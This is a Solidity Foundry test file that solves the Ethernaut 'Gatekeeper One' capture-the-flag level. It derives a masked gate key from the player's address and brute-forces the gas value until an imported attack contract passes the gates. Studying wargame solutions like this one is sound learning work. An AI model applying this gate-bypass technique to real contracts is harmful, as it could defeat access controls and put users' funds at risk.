// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
import "../src/GatekeeperOne/GatekeeperOne.sol";
import "../src/GatekeeperOne/GatekeeperOneFactory.sol";
import "../src/GatekeeperOne/GatekeeperOneHack.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

//ref https://stermi.medium.com/the-ethernaut-challenge-13-solution-gatekeeper-one-7587bfb38550

contract GatekeeperOneTest is Test {
    address _alice;

    function setUp() public {
        _alice = makeAddr("alice");
        vm.deal(_alice, 5 ether);
    }

    function testGatekeeper() public {
        GatekeeperOneFactory factory = new GatekeeperOneFactory();
        address instance = factory.createInstance(_alice);
        GatekeeperOneHack hack = new GatekeeperOneHack();
        vm.startPrank(_alice, _alice);
        bytes8 key = bytes8(uint64(uint160(address(_alice)))) & // address 20bytes
            0xFFFFFFFF0000FFFF; // (2^4 = 0.5bytes) * 16 = bytes8
        for (uint256 i = 0; i < 8191; i++) {
            try hack.attack{gas: 800000 + i}(instance, key) {
                console.log("passed");
                break;
            } catch {}
        }
        vm.stopPrank();
        assertTrue(factory.validateInstance(payable(instance), _alice));
    }
}
